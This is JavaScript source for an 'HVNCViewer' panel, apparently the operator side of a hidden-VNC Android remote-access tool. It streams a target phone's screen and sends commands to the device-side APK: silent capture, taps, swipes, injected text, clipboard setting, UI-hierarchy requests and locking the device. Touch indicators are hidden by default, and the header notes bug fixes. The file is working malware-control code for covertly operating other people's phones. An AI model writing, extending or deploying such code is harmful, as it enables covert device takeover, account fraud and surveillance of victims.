'use strict';
/**
 * HVNCViewer v2 — [K] rebuild
 *
 * Pipeline (unchanged — GPU decode, zero-copy):
 *   WS binary → parse 49B header → Worker createImageBitmap()
 *   → pendingBitmap → rAF ctx.drawImage (desynchronized)
 *
 * FIXES applied:
 *   [Bug 4] mouseup swipe threshold: < 14 → < 0.03 (normalized).
 *           Previous threshold was larger than the max possible hypot (√2≈1.41)
 *           so SWIPE was never reachable from mouse drag.
 *   [Bug 4] touchend swipe threshold: same fix applied.
 *   [Bug 5] wheel scroll y2 offset: ±400 (pixel-scale) → ±0.25 (normalized + clamped).
 *           Previous value produced coords like -399.5 which the APK rejected.
 *
 * ADDITIONS:
 *   ↺ VNC Restart button — sends FORCE_RESTART_VNC to APK then restarts stream subscription
 *   🔄 Refresh button — soft restart: stop() + start() without APK-side restart
 */

// ── Inline DecodeWorker ────────────────────────────────────────────────────────
const _WORKER_SRC = `
self.onmessage = async ({ data: { seq, buf } }) => {
  try {
    const bmp = await createImageBitmap(
      new Blob([buf], { type: 'image/jpeg' }),
      { premultiplyAlpha: 'none', colorSpaceConversion: 'none' }
    );
    self.postMessage({ seq, bmp }, [bmp]);
  } catch {}
};
`;

let _worker    = null;
let _workerRef = 0;

function acquireWorker() {
  if (!_worker) {
    const blob = new Blob([_WORKER_SRC], { type: 'application/javascript' });
    _worker = new Worker(URL.createObjectURL(blob));
  }
  _workerRef++;
  return _worker;
}

function releaseWorker() {
  if (--_workerRef <= 0 && _worker) {
    _worker.terminate();
    _worker    = null;
    _workerRef = 0;
  }
}

// ── FPS sparkline ──────────────────────────────────────────────────────────────
class FpsSparkline {
  constructor(w = 80, h = 22, maxFps = 30) {
    this.w = w; this.h = h; this.maxFps = maxFps;
    this.history = new Array(w).fill(0);
    this._lat = -1;
  }
  push(fps) { this.history.shift(); this.history.push(Math.min(fps, this.maxFps)); }
  setLatency(ms) { this._lat = ms; }
  draw(ctx, x, y) {
    const { w, h, history, maxFps } = this;
    ctx.save();
    ctx.fillStyle = 'rgba(0,0,0,0.62)';
    ctx.fillRect(x, y, w + 60, h + 8);
    for (let i = 0; i < w; i++) {
      const v  = history[i];
      const bh = Math.round((v / maxFps) * h);
      ctx.fillStyle = `hsl(${120 * (v / maxFps)},80%,48%)`;
      ctx.fillRect(x + i, y + h - bh + 4, 1, bh);
    }
    const cur = history[w - 1];
    const lat = this._lat;
    ctx.font      = 'bold 11px monospace';
    ctx.fillStyle = cur >= 10 ? '#3dba7a' : cur >= 4 ? '#e0b84a' : '#e05c5c';
    ctx.fillText(`${cur.toFixed(1)} FPS`, x + w + 3, y + 12);
    ctx.font      = '9px monospace';
    ctx.fillStyle = '#6666aa';
    ctx.fillText(lat >= 0 ? `${lat}ms` : '---', x + w + 3, y + 24);
    ctx.restore();
  }
}

// ── HVNCViewer ─────────────────────────────────────────────────────────────────
class HVNCViewer {
  /**
   * @param {HTMLElement} container
   * @param {string}      deviceId
   * @param {Function}    sendFn    — ws.sendJson(obj)
   * @param {{ frameW, frameH, screenW, screenH }} opts
   */
  constructor(container, deviceId, sendFn, opts = {}) {
    this.container = container;
    this.deviceId  = deviceId;
    this._send     = sendFn;

    this.frameW  = opts.frameW  ?? 360;
    this.frameH  = opts.frameH  ?? 780;
    this.screenW = opts.screenW ?? 1080;
    this.screenH = opts.screenH ?? 1920;

    this._zoom    = 1.0;
    this._quality = 50;
    this._mode    = 'vnc';   // 'vnc' | 'v2' | 'duplo'
    this._running = false;

    this._buildUI();

    // Frame pipeline
    this._pending   = null;
    this._seq       = 0;
    this._latestSeq = -1;
    this._rafId     = null;

    // Metrics
    this._times     = [];
    this._latencies = [];
    this._dropped   = 0;
    this._sparkline = new FpsSparkline(80, 22, 30);
    this._sparkTimer = setInterval(() => this._sparkline.push(this.fps), 1000);
    this._showOverlay = true;

    // Quality adaptation
    this._stableLow  = 0;
    this._stableHigh = 0;
    this._qaTimer    = setInterval(() => this._adaptQuality(), 1000);

    // Worker
    this._worker = acquireWorker();
    this._worker.onmessage = ({ data: { seq, bmp } }) => {
      if (seq < this._latestSeq) { bmp.close(); this._dropped++; return; }
      this._latestSeq = seq;
      if (this._pending) { this._pending.close(); this._dropped++; }
      this._pending = bmp;
    };

    // Input
    this._mouse = { down: false, origin: null, t: 0 };
    this._pinch = { dist: 0, active: false };
    this._bindInput();

    this._startRenderLoop();
    this._drawPlaceholder();
  }

  // ── UI ──────────────────────────────────────────────────────────────────────
  _buildUI() {
    this.container.innerHTML = `
    <div id="_hv_root" style="display:flex;flex-direction:column;width:100%;height:100%;background:#06060f">

      <!-- TOP BAR: controls -->
      <div id="_hv_topbar" style="
        display:flex;align-items:center;gap:8px;padding:6px 10px;
        background:#0e0e1c;border-bottom:1px solid #1a1a2e;flex-shrink:0;flex-wrap:wrap">

        <!-- Mode selector -->
        <div style="display:flex;border:1px solid #1e1e32;border-radius:6px;overflow:hidden">
          <button id="_hv_m_vnc"  class="_hvmode active" data-mode="vnc" >VNC</button>
          <button id="_hv_m_v2"   class="_hvmode"        data-mode="v2"  >V2</button>
          <button id="_hv_m_dpl"  class="_hvmode"        data-mode="duplo">DUPLO</button>
        </div>

        <!-- Start / Stop -->
        <button id="_hv_start" style="
          background:#1e5c2a;border:1px solid #3dba7a;color:#3dba7a;
          border-radius:5px;padding:4px 14px;font-size:12px;font-weight:700;cursor:pointer">
          ▶ START
        </button>
        <button id="_hv_stop" style="
          background:#3d0a0a;border:1px solid #e05c5c;color:#e05c5c;
          border-radius:5px;padding:4px 14px;font-size:12px;font-weight:700;cursor:pointer">
          ⏹ STOP
        </button>

        <div style="width:1px;height:22px;background:#1e1e32;margin:0 2px"></div>

        <!-- Quality -->
        <span style="font-size:10px;color:#555">Q</span>
        <input type="range" id="_hv_q" min="10" max="85" value="50" step="5"
          style="width:80px;accent-color:#7c6af7">
        <span id="_hv_ql" style="font-size:10px;color:#7c6af7;width:26px">50%</span>

        <!-- Zoom -->
        <span style="font-size:10px;color:#555">Z</span>
        <input type="range" id="_hv_zoom" min="50" max="300" value="100" step="10"
          style="width:70px;accent-color:#3dba7a">
        <span id="_hv_zl" style="font-size:10px;color:#3dba7a;width:34px">100%</span>
        <button id="_hv_zreset" style="
          background:none;border:1px solid #222244;color:#555;
          border-radius:4px;padding:2px 6px;font-size:10px;cursor:pointer">1:1</button>

        <span style="flex:1"></span>

        <!-- Status chip -->
        <div id="_hv_status" style="
          font-size:10px;color:#333356;background:#0e0e1c;
          border:1px solid #1a1a2e;border-radius:4px;padding:2px 8px">
          IDLE
        </div>
        <span id="_hv_dim" style="font-size:9px;color:#222240">${this.frameW}×${this.frameH}</span>
      </div>

      <!-- GESTURE TOOLBAR -->
      <div id="_hv_gestures" style="
        display:flex;align-items:center;gap:4px;padding:4px 10px;
        background:#090915;border-bottom:1px solid #14142a;flex-shrink:0;flex-wrap:wrap">

        <!-- Navigation -->
        <button class="_hvbtn" data-cmd="BACK"         title="Back">← Back</button>
        <button class="_hvbtn" data-cmd="HOME"         title="Home">⌂ Home</button>
        <button class="_hvbtn" data-cmd="RECENTS"      title="Recents">⧉ Recents</button>
        <button class="_hvbtn" data-cmd="NOTIFICATIONS" title="Notifications">🔔 Notifs</button>
        <button class="_hvbtn" data-cmd="QUICK_SETTINGS" title="Quick Settings">⚙ QS</button>

        <div style="width:1px;height:18px;background:#1a1a2e;margin:0 2px"></div>

        <!-- System -->
        <button class="_hvbtn" data-cmd="WAKEUP"      title="Wake Screen">☀ Wake</button>
        <button class="_hvbtn" data-cmd="LOCK_DEVICE" title="Lock Screen">🔒 Lock</button>
        <button class="_hvbtn" data-cmd="POWER_MENU"  title="Power Menu">⏻ Power</button>
        <button class="_hvbtn" data-cmd="VOLUME_UP"   title="Volume Up">🔊+</button>
        <button class="_hvbtn" data-cmd="VOLUME_DOWN" title="Volume Down">🔉−</button>

        <div style="width:1px;height:18px;background:#1a1a2e;margin:0 2px"></div>

        <!-- Input -->
        <button class="_hvbtn" data-cmd="SNAP_SCREEN" title="Screenshot">📷 Snap</button>
        <button id="_hv_typebtn" style="
          background:#1a1a2e;border:1px solid #2a2a50;color:#888;
          border-radius:4px;padding:2px 8px;font-size:10px;cursor:pointer" title="Type text">⌨ Type</button>
        <button id="_hv_pastebtn" style="
          background:#1a1a2e;border:1px solid #2a2a50;color:#888;
          border-radius:4px;padding:2px 8px;font-size:10px;cursor:pointer" title="Paste clipboard">📋 Paste</button>
        <button id="_hv_hierarchybtn" style="
          background:#1a1a2e;border:1px solid #2a2a50;color:#888;
          border-radius:4px;padding:2px 8px;font-size:10px;cursor:pointer" title="Request hierarchy">🌳 Hier</button>

        <div style="width:1px;height:18px;background:#1a1a2e;margin:0 2px"></div>

        <!-- Stream controls -->
        <!-- [ADDED] Restart VNC: tells APK to restart its capture engine, then re-subscribes -->
        <button id="_hv_restartbtn" style="
          background:#1a1a2e;border:1px solid #7c4af7;color:#7c4af7;
          border-radius:4px;padding:2px 8px;font-size:10px;cursor:pointer;font-weight:600"
          title="Restart VNC capture on device + re-subscribe stream">↺ VNC Restart</button>

        <!-- [ADDED] Refresh: soft restart of the stream subscription (no APK-side restart) -->
        <button id="_hv_refreshbtn" style="
          background:#1a1a2e;border:1px solid #3dba7a;color:#3dba7a;
          border-radius:4px;padding:2px 8px;font-size:10px;cursor:pointer"
          title="Soft refresh: stop + re-subscribe stream">🔄 Refresh</button>

        <div style="width:1px;height:18px;background:#1a1a2e;margin:0 2px"></div>

        <!-- Touch visibility toggle -->
        <button id="_hv_touchtoggle" style="
          background:#1a1a2e;border:1px solid #2a2a50;color:#888;
          border-radius:4px;padding:2px 8px;font-size:10px;cursor:pointer">👁 Toques: OCULTOS</button>

        <span style="flex:1"></span>
        <button id="_hv_overlayToggle" style="
          background:none;border:none;color:#333;font-size:10px;cursor:pointer">Overlay</button>
      </div>

      <!-- CANVAS AREA (flex row for DUPLO) -->
      <div id="_hv_canvasrow" style="flex:1;overflow:hidden;display:flex;align-items:stretch;justify-content:center;background:#06060f">
        <!-- Primary canvas -->
        <div style="flex:1;display:flex;align-items:center;justify-content:center;overflow:hidden">
          <canvas id="_hv_cv" tabindex="0" style="
            max-width:100%;max-height:100%;object-fit:contain;
            cursor:crosshair;outline:none;user-select:none;touch-action:none;
            transform-origin:center center"></canvas>
        </div>
        <!-- V2 canvas (DUPLO right side) -->
        <div id="_hv_v2panel" style="flex:1;display:none;align-items:center;justify-content:center;overflow:hidden;border-left:1px solid #1a1a2e">
          <canvas id="_hv_cv2" tabindex="0" style="
            max-width:100%;max-height:100%;object-fit:contain;
            cursor:crosshair;outline:none;user-select:none;touch-action:none"></canvas>
        </div>
      </div>
    </div>

    <style>
      ._hvmode {
        background: none; border: none; color: #444; padding: 3px 10px;
        font-size: 11px; font-weight: 700; cursor: pointer; transition: background .15s;
      }
      ._hvmode.active { background: #1e1e38; color: #7c6af7; }
      ._hvmode:hover:not(.active) { background: #12121f; color: #666; }
      ._hvbtn {
        background: #0e0e1e; border: 1px solid #1e1e32; color: #777;
        border-radius: 4px; padding: 2px 8px; font-size: 10px; cursor: pointer;
        transition: background .12s, color .12s, border-color .12s;
      }
      ._hvbtn:hover { background: #1a1a2e; color: #aaa; border-color: #2a2a50; }
      ._hvbtn:active { background: #252540; }
    </style>`;

    // Elements
    this.canvas  = this.container.querySelector('#_hv_cv');
    this.canvas2 = this.container.querySelector('#_hv_cv2');
    this.canvas.width  = this.frameW;
    this.canvas.height = this.frameH;
    this.canvas2.width  = this.frameW;
    this.canvas2.height = this.frameH;

    this.ctx  = this.canvas.getContext('2d',  { alpha: false, desynchronized: true });
    this.ctx2 = this.canvas2.getContext('2d', { alpha: false, desynchronized: true });
    this.canvas.focus();

    this._bindToolbar();
  }

  _bindToolbar() {
    const c = this.container;

    // Mode selector
    c.querySelectorAll('._hvmode').forEach(btn => {
      btn.addEventListener('click', () => {
        c.querySelectorAll('._hvmode').forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        const wasRunning = this._running;
        if (wasRunning) this.stop();
        this._mode = btn.dataset.mode;
        const v2panel = c.querySelector('#_hv_v2panel');
        if (this._mode === 'duplo') {
          v2panel.style.display = 'flex';
        } else {
          v2panel.style.display = 'none';
        }
        if (wasRunning) setTimeout(() => this.start(), 200);
      });
    });

    // Start / Stop
    c.querySelector('#_hv_start').addEventListener('click', () => this.start());
    c.querySelector('#_hv_stop' ).addEventListener('click', () => this.stop());

    // Quality
    const qSl = c.querySelector('#_hv_q');
    const qLb = c.querySelector('#_hv_ql');
    qSl.addEventListener('input', () => {
      this._quality = parseInt(qSl.value);
      qLb.textContent = this._quality + '%';
      if (this._running) this._cmd('SET_SILENT_VNC_QUALITY', { quality: this._quality });
    });

    // Zoom
    const zSl = c.querySelector('#_hv_zoom');
    const zLb = c.querySelector('#_hv_zl');
    zSl.addEventListener('input', () => {
      this._zoom = parseInt(zSl.value) / 100;
      zLb.textContent = zSl.value + '%';
      this._applyZoom();
    });
    c.querySelector('#_hv_zreset').addEventListener('click', () => {
      this._zoom = 1; zSl.value = 100; zLb.textContent = '100%'; this._applyZoom();
    });

    // Gesture buttons
    c.querySelectorAll('._hvbtn').forEach(btn => {
      btn.addEventListener('click', () => this._cmd(btn.dataset.cmd, {}));
    });

    // Type button
    c.querySelector('#_hv_typebtn').addEventListener('click', () => {
      const text = prompt('Type text to inject:');
      if (text !== null && text.length > 0) this._cmd('TYPE', { text });
    });

    // Paste button
    c.querySelector('#_hv_pastebtn').addEventListener('click', () => {
      navigator.clipboard.readText().then(text => {
        if (text) {
          this._cmd('SET_CLIPBOARD', { text });
          setTimeout(() => this._cmd('TYPE', { text }), 100);
        }
      }).catch(() => {
        const text = prompt('Paste text (clipboard denied):');
        if (text) { this._cmd('SET_CLIPBOARD', { text }); setTimeout(() => this._cmd('TYPE', { text }), 100); }
      });
    });

    // Hierarchy button
    c.querySelector('#_hv_hierarchybtn').addEventListener('click', () => {
      this._cmd('REQUEST_HIERARCHY', {});
    });

    // [ADDED] VNC Restart button
    // Sends FORCE_RESTART_VNC to the APK (restarts capture service on device),
    // then after 600ms stops and restarts the stream subscription on our side.
    c.querySelector('#_hv_restartbtn').addEventListener('click', () => {
      this._cmd('FORCE_RESTART_VNC', {});
      const wasRunning = this._running;
      if (wasRunning) this.stop();
      setTimeout(() => {
        if (wasRunning) this.start();
      }, 600);
    });

    // [ADDED] Refresh button
    // Soft restart: stop() then start() without disturbing the APK capture engine.
    // Use this when the stream freezes or subscription drops without device-side issues.
    c.querySelector('#_hv_refreshbtn').addEventListener('click', () => {
      const wasRunning = this._running;
      if (wasRunning) {
        this.stop();
        setTimeout(() => this.start(), 300);
      } else {
        this.start();
      }
    });

    // Touch visibility toggle
    let touchVisible = false;
    const touchBtn = c.querySelector('#_hv_touchtoggle');
    touchBtn.addEventListener('click', () => {
      touchVisible = !touchVisible;
      touchBtn.textContent = `👁 Toques: ${touchVisible ? 'VISÍVEIS' : 'OCULTOS'}`;
      touchBtn.style.color = touchVisible ? '#3dba7a' : '#888';
      touchBtn.style.borderColor = touchVisible ? '#3dba7a' : '#2a2a50';
      this._cmd('TOGGLE_TOUCH_VISIBILITY', { visible: touchVisible });
    });

    // Overlay toggle
    c.querySelector('#_hv_overlayToggle').addEventListener('click', () => this.toggleOverlay());
  }

  _applyZoom() {
    this.canvas.style.transform = `scale(${this._zoom})`;
  }

  // ── Public: start streaming ────────────────────────────────────────────────
  start() {
    if (this._running) return;
    this._running = true;
    this._setStatus('LIVE', '#3dba7a');

    switch (this._mode) {
      case 'vnc':
        // Subscribe → hub sends: {action:'START_SILENT_VNC', enabled:true, quality:N}
        this._sendOp({ type: 'vnc_subscribe', devId: this.deviceId, quality: this._quality });
        break;

      case 'v2':
        // V2 = MediaProjection-based capture
        this._sendOp({ type: 'vnc_v2_subscribe', devId: this.deviceId, quality: this._quality });
        break;

      case 'duplo':
        // DUPLO = both streams simultaneously
        this._sendOp({ type: 'vnc_subscribe',    devId: this.deviceId, quality: this._quality });
        this._sendOp({ type: 'vnc_v2_subscribe', devId: this.deviceId, quality: this._quality });
        break;
    }
  }

  // ── Public: stop streaming ─────────────────────────────────────────────────
  stop() {
    if (!this._running) return;
    this._running = false;
    this._setStatus('IDLE', '#333356');

    switch (this._mode) {
      case 'vnc':
        this._sendOp({ type: 'vnc_unsubscribe', devId: this.deviceId });
        break;
      case 'v2':
        this._sendOp({ type: 'vnc_v2_unsubscribe', devId: this.deviceId });
        break;
      case 'duplo':
        this._sendOp({ type: 'vnc_unsubscribe',    devId: this.deviceId });
        this._sendOp({ type: 'vnc_v2_unsubscribe', devId: this.deviceId });
        break;
    }

    this._drawPlaceholder();
  }

  _setStatus(label, color) {
    const el = this.container.querySelector('#_hv_status');
    if (el) { el.textContent = label; el.style.color = color; el.style.borderColor = color + '55'; }
  }

  // ── Public: receive JPEG frame ─────────────────────────────────────────────
  onFrame(jpegBuf, serverTs, isV2 = false) {
    const seq = ++this._seq;
    const now = performance.now();

    this._times.push(now);
    if (this._times.length > 60) this._times.shift();

    if (serverTs > 0) {
      const lat = Date.now() - serverTs;
      if (lat >= 0 && lat < 8000) {
        this._latencies.push(lat);
        if (this._latencies.length > 30) this._latencies.shift();
        this._sparkline.setLatency(Math.round(
          this._latencies.reduce((a, b) => a + b, 0) / this._latencies.length
        ));
      }
    }

    if (isV2 && this._mode === 'duplo') {
      // V2 frame → right canvas
      createImageBitmap(
        new Blob([jpegBuf], { type: 'image/jpeg' }),
        { premultiplyAlpha: 'none', colorSpaceConversion: 'none' }
      ).then(bmp => {
        this.ctx2.drawImage(bmp, 0, 0, this.canvas2.width, this.canvas2.height);
        bmp.close();
      }).catch(() => {});
      return;
    }

    // Zero-copy Transferable to Worker
    this._worker.postMessage({ seq, buf: jpegBuf }, [jpegBuf]);
  }

  // ── Metrics ───────────────────────────────────────────────────────────────
  get fps() {
    const t = this._times;
    if (t.length < 2) return 0;
    const span = t[t.length - 1] - t[0];
    return span > 0 ? (t.length - 1) / (span / 1000) : 0;
  }

  toggleOverlay() { this._showOverlay = !this._showOverlay; }

  // ── Render loop ────────────────────────────────────────────────────────────
  _startRenderLoop() {
    const tick = () => {
      this._rafId = requestAnimationFrame(tick);
      if (!this._pending) return;
      this.ctx.drawImage(this._pending, 0, 0, this.canvas.width, this.canvas.height);
      this._pending.close();
      this._pending = null;
      if (this._showOverlay) this._drawOverlay();
    };
    this._rafId = requestAnimationFrame(tick);
  }

  _drawOverlay() {
    this._sparkline.draw(this.ctx, 4, 4);
  }

  _drawPlaceholder() {
    const c = this.ctx;
    const w = this.canvas.width;
    const h = this.canvas.height;
    c.fillStyle = '#06060f';
    c.fillRect(0, 0, w, h);
    c.strokeStyle = '#1e1e38';
    c.lineWidth = 1.5;
    c.beginPath();
    if (c.roundRect) {
      c.roundRect(w / 2 - 80, h / 2 - 140, 160, 280, 14);
    } else {
      c.rect(w / 2 - 80, h / 2 - 140, 160, 280);
    }
    c.stroke();
    c.fillStyle = '#2a2a4a';
    c.font = 'bold 12px monospace';
    c.textAlign = 'center';
    c.fillText('Press ▶ START', w / 2, h / 2 + 10);
    c.font = '10px monospace';
    c.fillStyle = '#1e1e32';
    c.fillText(`Mode: ${this._mode.toUpperCase()}`, w / 2, h / 2 + 28);
    c.textAlign = 'left';
  }

  // ── Quality adaptation ─────────────────────────────────────────────────────
  _adaptQuality() {
    const fps = this.fps;
    if (fps === 0) { this._stableLow = this._stableHigh = 0; return; }

    if (fps < 4)       { this._stableLow++;  this._stableHigh = 0; }
    else if (fps > 18) { this._stableHigh++; this._stableLow  = 0; }
    else               { this._stableLow = this._stableHigh = 0; }

    if (this._stableLow >= 6 && this._quality > 15) {
      this._quality = Math.max(15, this._quality - 10);
      this._updateQualitySlider();
      if (this._running) this._cmd('SET_SILENT_VNC_QUALITY', { quality: this._quality });
      this._stableLow = 0;
    }
    if (this._stableHigh >= 8 && this._quality < 80) {
      this._quality = Math.min(80, this._quality + 5);
      this._updateQualitySlider();
      if (this._running) this._cmd('SET_SILENT_VNC_QUALITY', { quality: this._quality });
      this._stableHigh = 0;
    }
  }

  _updateQualitySlider() {
    const sl = this.container.querySelector('#_hv_q');
    const lb = this.container.querySelector('#_hv_ql');
    if (sl) sl.value = this._quality;
    if (lb) lb.textContent = this._quality + '%';
  }

  // ── Coordinate mapping ────────────────────────────────────────────────────
  _mapCoords(clientX, clientY) {
    const r  = this.canvas.getBoundingClientRect();
    const sx = (this.frameW / r.width)  / this._zoom;
    const sy = (this.frameH / r.height) / this._zoom;
    return {
      x: Math.max(0, Math.min(1, ((clientX - r.left) * sx) / this.frameW)),
      y: Math.max(0, Math.min(1, ((clientY - r.top)  * sy) / this.frameH)),
    };
  }

  // ── Commands ───────────────────────────────────────────────────────────────
  _cmd(cmd, args = {}) {
    this._send({ type: 'cmd', target: this.deviceId, cmd, args });
  }

  _sendOp(obj) {
    this._send(obj);
  }

  // ── Input ──────────────────────────────────────────────────────────────────
  _bindInput() {
    const c = this.canvas;

    // [Bug 4 FIX] SWIPE_THRESHOLD changed from 14 to 0.03 (normalized).
    // _mapCoords returns values clamped to [0.0, 1.0]. The max possible
    // Math.hypot(dx, dy) across the full canvas is √2 ≈ 1.414.
    // The original threshold of 14 is always > 1.414, so the else branch
    // (SWIPE) was unreachable — every interaction became TAP or LONG_PRESS.
    // 0.03 = 3% of screen dimension, which correctly distinguishes intentional
    // drags from tap jitter.
    const SWIPE_THRESHOLD = 0.03;

    c.addEventListener('contextmenu', e => {
      e.preventDefault();
      const pos = this._mapCoords(e.clientX, e.clientY);
      this._cmd('LONG_PRESS', { x: pos.x, y: pos.y });
    });

    c.addEventListener('mousedown', e => {
      if (e.button !== 0) return;
      this._mouse.down   = true;
      this._mouse.origin = this._mapCoords(e.clientX, e.clientY);
      this._mouse.t      = performance.now();
      c.focus();
    });

    c.addEventListener('mouseup', e => {
      if (!this._mouse.down) return;
      this._mouse.down = false;
      const up  = this._mapCoords(e.clientX, e.clientY);
      const dur = performance.now() - this._mouse.t;
      const dx  = up.x - this._mouse.origin.x;
      const dy  = up.y - this._mouse.origin.y;

      // [Bug 4 FIX] Was: Math.hypot(dx, dy) < 14  (always true, SWIPE unreachable)
      if (Math.hypot(dx, dy) < SWIPE_THRESHOLD) {
        this._cmd(dur < 500 ? 'TAP' : 'LONG_PRESS',
          { x: this._mouse.origin.x, y: this._mouse.origin.y });
      } else {
        this._cmd('SWIPE', {
          x1: this._mouse.origin.x, y1: this._mouse.origin.y,
          x2: up.x, y2: up.y,
          duration: Math.max(80, Math.min(Math.round(dur), 1500)),
        });
      }
    });

    c.addEventListener('mouseleave', () => { this._mouse.down = false; });

    c.addEventListener('wheel', e => {
      e.preventDefault();
      if (e.ctrlKey || e.metaKey) {
        this._zoom = Math.max(0.5, Math.min(3, this._zoom * (e.deltaY < 0 ? 1.1 : 0.9)));
        this._applyZoom();
        const sl = this.container.querySelector('#_hv_zoom');
        const lb = this.container.querySelector('#_hv_zl');
        if (sl) sl.value = Math.round(this._zoom * 100);
        if (lb) lb.textContent = Math.round(this._zoom * 100) + '%';
        return;
      }
      const pos = this._mapCoords(e.clientX, e.clientY);

      // [Bug 5 FIX] Was: delta = e.deltaY > 0 ? 400 : -400, then y2: pos.y - delta
      // pos.y is normalized [0,1]. Subtracting ±400 produced values like -399.5
      // which the APK auto-detected as pixel-scale, multiplied by screen height,
      // and got -383,520px — an impossible coordinate that GestureDescription rejected.
      // Fix: use normalized delta ±0.25 (25% of screen height) clamped to [0.01, 0.99].
      const delta = e.deltaY > 0 ? 0.25 : -0.25;
      this._cmd('SWIPE', {
        x1: pos.x, y1: pos.y,
        x2: pos.x, y2: Math.max(0.01, Math.min(0.99, pos.y - delta)),
        duration: 200,
      });
    }, { passive: false });

    c.addEventListener('keydown', e => {
      e.preventDefault();
      if (e.ctrlKey || e.metaKey) {
        switch (e.key.toLowerCase()) {
          case 'h': this._cmd('HOME', {});    return;
          case 'b': this._cmd('BACK', {});    return;
          case 'r': this._cmd('RECENTS', {}); return;
          case 'v':
            navigator.clipboard.readText().then(text => {
              if (text) { this._cmd('SET_CLIPBOARD', { text }); setTimeout(() => this._cmd('TYPE', { text }), 100); }
            }).catch(() => {});
            return;
          case 'c': this._cmd('LOCK_DEVICE', {}); return;
          case 's': this.start();  return;
          case 'q': this.stop();   return;
        }
      }
      switch (e.key) {
        case 'Escape':    this._cmd('BACK',           {}); return;
        case 'F1':        this._cmd('HOME',           {}); return;
        case 'F2':        this._cmd('RECENTS',        {}); return;
        case 'F3':        this._cmd('QUICK_SETTINGS', {}); return;
        case 'F5':        this._cmd('FORCE_RESTART_VNC', {}); return;
        case 'Tab':       this._cmd('TYPE', { text: '\t' }); return;
        case 'Backspace': this._cmd('TYPE', { text: '\b' }); return;
        case 'Enter':     this._cmd('TYPE', { text: '\n' }); return;
        case 'Delete':    this._cmd('TYPE', { text: '\x7f' }); return;
        case 'ArrowUp':
          this._cmd('SWIPE', { x1: .5, y1: .65, x2: .5, y2: .3,  duration: 200 }); return;
        case 'ArrowDown':
          this._cmd('SWIPE', { x1: .5, y1: .3,  x2: .5, y2: .65, duration: 200 }); return;
        case 'ArrowLeft':
          this._cmd('SWIPE', { x1: .75, y1: .5, x2: .2, y2: .5,  duration: 200 }); return;
        case 'ArrowRight':
          this._cmd('SWIPE', { x1: .2, y1: .5,  x2: .75, y2: .5, duration: 200 }); return;
      }
      if (e.key.length === 1 && !e.ctrlKey && !e.altKey && !e.metaKey) {
        this._cmd('TYPE', { text: e.key });
      }
    });

    // Touch (tablet operators)
    c.addEventListener('touchstart', e => {
      e.preventDefault();
      if (e.touches.length === 2) {
        this._pinch.active = true;
        this._pinch.dist = Math.hypot(
          e.touches[0].clientX - e.touches[1].clientX,
          e.touches[0].clientY - e.touches[1].clientY
        );
        return;
      }
      const t = e.touches[0];
      this._mouse.down   = true;
      this._mouse.origin = this._mapCoords(t.clientX, t.clientY);
      this._mouse.t      = performance.now();
      c.focus();
    }, { passive: false });

    c.addEventListener('touchmove', e => {
      e.preventDefault();
      if (this._pinch.active && e.touches.length === 2) {
        const nd = Math.hypot(
          e.touches[0].clientX - e.touches[1].clientX,
          e.touches[0].clientY - e.touches[1].clientY
        );
        this._zoom = Math.max(0.5, Math.min(3, this._zoom * (nd / this._pinch.dist)));
        this._pinch.dist = nd;
        this._applyZoom();
      }
    }, { passive: false });

    c.addEventListener('touchend', e => {
      e.preventDefault();
      this._pinch.active = false;
      if (!this._mouse.down) return;
      this._mouse.down = false;
      const t   = e.changedTouches[0];
      const up  = this._mapCoords(t.clientX, t.clientY);
      const dur = performance.now() - this._mouse.t;
      const dx  = up.x - this._mouse.origin.x;
      const dy  = up.y - this._mouse.origin.y;

      // [Bug 4 FIX] Same threshold fix applied to touchend handler.
      // Was: Math.hypot(dx, dy) < 14 — always true, SWIPE unreachable from touch input.
      if (Math.hypot(dx, dy) < SWIPE_THRESHOLD && dur < 500) {
        this._cmd('TAP', { x: this._mouse.origin.x, y: this._mouse.origin.y });
      } else if (Math.hypot(dx, dy) < SWIPE_THRESHOLD) {
        this._cmd('LONG_PRESS', { x: this._mouse.origin.x, y: this._mouse.origin.y });
      } else {
        this._cmd('SWIPE', {
          x1: this._mouse.origin.x, y1: this._mouse.origin.y,
          x2: up.x, y2: up.y, duration: Math.max(80, Math.round(dur)),
        });
      }
    }, { passive: false });
  }

  // ── Cleanup ────────────────────────────────────────────────────────────────
  destroy() {
    this.stop();
    cancelAnimationFrame(this._rafId);
    clearInterval(this._qaTimer);
    clearInterval(this._sparkTimer);
    if (this._pending) { this._pending.close(); this._pending = null; }
    releaseWorker();
  }
}
